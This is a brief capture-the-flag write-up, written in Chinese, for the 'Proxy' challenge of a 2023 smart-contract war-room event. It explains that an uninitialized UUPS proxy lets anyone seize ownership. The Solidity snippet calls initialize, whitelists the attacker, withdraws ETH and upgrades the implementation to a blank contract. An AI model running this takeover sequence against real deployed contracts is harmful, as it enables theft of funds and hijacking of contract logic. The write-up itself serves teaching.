# Writeup

refer to [Repo](https://github.com/Snooowgh/warroom-ethcc-2023)

## 1. Proxy

题目要求其他人无法接管合约的implementation
Proxy合约未被初始化, 任何人可以获取owner权限
步骤如下:

- 调用initialize函数成为owner
- 调用whitelistUser函数加入到白名单中
- 调用withdraw函数提取 2 wei ETH
- 调用upgradeTo函数升级合约到自定义的空合约(UUPSUpgradeable合约函数)

```solidity
address(proxy).call{value: 0.1 ether}(
    abi.encodeWithSignature("initialize(address)", address(0))
);
address(proxy).call(
abi.encodeWithSignature("whitelistUser(address)", attacker)
);
address(proxy).call(
abi.encodeWithSignature("withdraw(uint256)", 2)
);
Blank blank = new Blank();
address(proxy).call(
abi.encodeWithSignature("upgradeTo(address)", address(blank))
);

```